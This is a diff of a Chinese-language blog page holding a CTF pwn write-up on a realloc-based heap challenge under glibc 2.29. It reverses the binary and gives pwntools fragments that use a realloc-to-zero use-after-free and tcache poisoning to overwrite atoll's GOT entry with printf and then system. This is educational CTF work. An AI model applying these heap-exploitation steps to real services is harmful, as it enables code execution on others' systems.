@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,24 +263,17 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-xRCoTAft" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
-
+    <div id="aplayer-xKgoGCQa" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
 <h1><span id="overview">overview</span></h1><p>​        上一道题不给我调试符号，我还能找到类似的版本用，这里直接不告诉我版本了，真牛。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%882.44.17.png" alt="截屏2022-05-14 下午2.44.17"></p>
 <p>如果这样看不出具体版本的话，一般的方法一个是盲测，另外就是在ida中搜索gnu字符串，再或者</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ./libc.so | grep <span class="string">&quot;GNU C Library&quot;</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%883.02.01.png" alt="截屏2022-05-14 下午3.02.01"></p>
 <p>`</p>
 <p>​        这道题的保护也是只有pie没有开，但是got表是可以改的。</p>
 <p>​        2.29的libc目前来说比较重大的改变就是增加了tcache dup时的key检测，不过如果条件足够的话还是很好绕过。</p>
 <h1><span id="reverse">reverse</span></h1><p>​        还是和tcache tear类似的结构。但是整个题目都是基于realloc实现的。</p>
 <h2><span id="alloc">alloc</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  idx = read_long();                            <span class="comment">// read in a long int</span></span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">1</span> || heap[idx] )                   <span class="comment">// idx &#x27;s  maximum is 1,which means we can allocate two chunk at most</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">    size = read_long();</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= <span class="number">0x78</span> )                         <span class="comment">// we can&#x27;t allocate unsorted bin directly</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptr = <span class="built_in">realloc</span>(<span class="number">0LL</span>, size);                 <span class="comment">// equal to malloc(size)</span></span><br><span class="line">      <span class="keyword">if</span> ( ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        heap[idx] = ptr;                        <span class="comment">// store the ptr in head[idx]</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">        v0 = (_BYTE *)(heap[idx] + read_input(heap[idx], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size));<span class="comment">// set the last character to 0</span></span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
 <h2><span id="re-alloc">re-alloc</span></h2><p>​        一个比较直观的realloc。</p>
 <h2><span id="re-free">re-free</span></h2><p>​        类似，这里没有明显的uaf。</p>
 <h1><span id="利用">利用</span></h1><p>​        逆完以后似乎没有发现明显可以利用的漏洞，并且程序是没有给我们提供show之类的函数的。由于我之前也咩有怎么做过realloc，所以不太熟悉，这里就动调一下。</p>
@@ -292,9 +285,6 @@
 <p>​        看了wp。。但是这个题似乎咩有我之前想得那么复杂，其实在realloc的环节将size置于0会造成uaf这个漏洞我之前是有思考过也确实尝试了，但是当时给我直接一个alloc error报错让我以为此路不通，我当时还为信誓旦旦地认为realloc的size为0会返回空指针，就会触发下面alloc 的检测，所以肯定不行，就没有再深入下去了。。所以为什么wp可以呢？</p>
 <p>​        。。不知道，大概是我之前输入的有问题。总之这个题大概思路就是在这里。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#chunk1</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;&quot;</span>) <span class="comment">#free chunk1 tcache =&gt;chunk1</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(elf.got[<span class="string">&quot;atoll&quot;</span>]))<span class="comment">#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。</span></span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>
-
-
-
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%889.42.43.png" alt="截屏2022-05-14 下午9.42.43"></p>
 <p>​    </p>
 <p>​        这道题大致的思路就是利用两次tcache dup改atoll的got表，一次将其改为printf，构造格式化字符串leak libc，另外一次就直接改atoll为system 从而getshell。</p>
@@ -302,7 +292,6 @@
 <p>​        其他没有什么特别的，我这里就主要研究一下排堆。</p>
 <p>​        其实到这里，我们已经将tcache的fd改为target addr了，但是这里还要绕过一个bk上的key，需要想办法把这个东西改成别的。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#chunk1</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;&quot;</span>) <span class="comment">#free chunk1 tcache =&gt;chunk1</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(elf.got[<span class="string">&quot;atoll&quot;</span>]))<span class="comment">#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。</span></span><br></pre></td></tr></table></figure>
-
 <p>​        在这一步bin情况如下：</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.07.10.png" alt="截屏2022-05-14 下午10.07.10"></p>
 <p>​        只构造成这样其实是不好处理的，就算不考虑key，我们想要dup到atoll got，首先要把0x7ffff7fff260申请掉，这里chunk0 已经在bin中了，想要重新申请就必须先要free掉，这样就直接double free了，不太行。所以这里只能用chunk1来将它申请掉。</p>
@@ -313,20 +302,14 @@
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.16.40.png" alt="截屏2022-05-14 下午10.16.40"></p>
 <p>关于这个地方，当我们把0x7ffff7fff260用chunk1申请掉，然后准备申请atoll got的时候，其实chunk1这里已经将bk覆盖为一个合法的值了，也就是说这里我们就已经能够成功将chunk0free了。</p>
 <p>​        但是如果就这样free的话，会变成这种情况：<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.27.42.png" alt="截屏2022-05-14 下午10.27.42"></p>
-<p>​        也就是fd就会变成atoll got，tcache bin又变成<code> 0x7ffff7fff260 —▸ 0x404048</code>了。原因很好理解，就是我们free了0x7ffff7fff260上的chunk0，所以被放入了tcache，那么如何让这个东西不被插入tcache呢？这个时候我们只要稍微调整一下chunk0的size，让它不正好插入到0x20的bin中就好了。</p>
+<p>​        也就是fd就会变成atoll got，tcache bin又变成<code>0x7ffff7fff260 —▸ 0x404048</code>了。原因很好理解，就是我们free了0x7ffff7fff260上的chunk0，所以被放入了tcache，那么如何让这个东西不被插入tcache呢？这个时候我们只要稍微调整一下chunk0的size，让它不正好插入到0x20的bin中就好了。</p>
 <p>​        </p>
 <p>​    先测试一下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#chunk1</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;&quot;</span>) <span class="comment">#free chunk1 tcache =&gt;chunk1</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(elf.got[<span class="string">&quot;atoll&quot;</span>]))<span class="comment">#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。</span></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#chunk2</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x18</span>,p64(elf.plt[<span class="string">&quot;printf&quot;</span>]))</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>
-
-
-
 <p>可以看到确实这一步atoll got被改为了printf got。</p>
 <p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-14%20%E4%B8%8B%E5%8D%8810.06.03.png" alt="截屏2022-05-14 下午10.06.03"></p>
 <p>​        但是由于需要改两次，如果在这里就把got改了，后面就不好执行了，所以可以先利用相同的办法创建两个tcache dup。还需要注意的是我们不能破釜沉舟，我们还需要将chunk1也free掉，以保证第二次能够正常利用，也就是：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#chunk1</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;&quot;</span>) <span class="comment">#free chunk1 tcache =&gt;chunk1</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(elf.got[<span class="string">&quot;atoll&quot;</span>]))<span class="comment">#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。</span></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#chunk2</span></span><br><span class="line"></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">b&quot;d&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-
-
 <p>​        这样换一下size再重复一次，就构造出了两个tcahce的dup，然后我们先把第一个atoll改为printf。</p>
 <p>​        然后直接利用格式化字符串leak libc。</p>
 <p>​        leak之后直接再利用第二个atoll将got改为system。这里的利用就比较套路化，没有什么值得研究的了，就是需要注意在最后一次申请的时候是利用printf的返回值作为长度。</p>
